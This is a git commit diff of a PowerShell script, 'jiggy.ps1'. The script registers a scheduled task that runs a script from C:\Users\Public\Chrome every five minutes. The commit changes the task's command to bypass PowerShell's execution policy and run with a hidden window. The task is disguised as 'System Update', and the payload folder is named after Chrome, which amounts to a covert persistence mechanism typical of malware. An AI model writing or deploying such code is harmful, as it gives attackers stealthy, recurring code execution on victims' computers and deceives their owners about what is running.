8f6cb47b3bf86aef974306fcb54deb5e4ea8fac8
Mxfire0324 <162410399+Mxfire0324@users.noreply.github.com>
2024-03-06 22:03:17 +0530

    Update jiggy.ps1

--- jiggy.ps1
+++ jiggy.ps1
@@ -1,4 +1,4 @@
-$action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument 'C:\Users\Public\Chrome\chrome.ps1'
+$action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument '-ExecutionPolicy Bypass -WindowStyle Hidden -File "C:\Users\Public\Chrome\chrome.ps1"'
 $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
 
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName 'System Update' -Description 'System Updates'
